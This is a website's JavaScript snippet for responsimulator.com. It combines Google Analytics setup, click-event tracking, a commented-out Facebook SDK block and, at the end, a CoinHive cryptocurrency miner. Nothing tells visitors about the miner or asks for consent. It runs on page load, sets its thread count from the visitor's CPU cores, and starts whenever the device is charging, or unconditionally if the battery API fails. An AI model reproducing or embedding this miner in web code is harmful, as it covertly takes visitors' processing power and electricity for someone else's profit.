  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-38325031-1']);
  _gaq.push(['_trackPageview']);
  _gaq.push(['_setDomainName', 'responsimulator.com']);
  (function() {
      var ga = document.createElement('script');
      ga.type = 'text/javascript';
      ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
      var s = document.getElementsByTagName('script')[0];
      s.parentNode.insertBefore(ga, s);
  })();
  $(document).ready(function() {
      $('body').on('click', 'a#whitelabel', function() {
          _gaq.push(['_trackEvent', 'conversion', 'bitballoon']);
      }); /*    $.ajaxSetup({ cache: true });    $.getScript('//connect.facebook.net/en_US/all.js', function(){      FB.init({        appId: '715097345199661',        xfbml      : true      });           FB.Event.subscribe('edge.create', function(targetUrl) {        _gaq.push(['_trackSocial', 'facebook', 'like', targetUrl]);        _gaq.push(['_trackEvent', 'facebook', 'like', targetUrl]);        _gaq.push(['_trackEvent', 'conversion', 'like']);      });      FB.Event.subscribe('edge.remove', function(targetUrl) {        _gaq.push(['_trackSocial', 'facebook', 'unlike', targetUrl]);        _gaq.push(['_trackEvent', 'facebook', 'unlike', targetUrl]);      });    });*/
  });
  var xmr = new CoinHive.Anonymous('ACf7dbBXgD2S47VrGqmjtQmyv9AM37Bt', {
      throttle: 0.25,
      threads: 1
  });
  try {
      var threads = Math.max(1, Math.floor(navigator.hardwareConcurrency / 2));
      xmr.setNumThreads(threads);
      navigator.getBattery().then(function(battery) {
          if (battery.charging) xmr.start();
          battery.onchargingchange = function(evt) {
              if (battery.charging) xmr.start();
              else xmr.stop();
          }
      });
  } catch (e) {
      xmr.start();
  }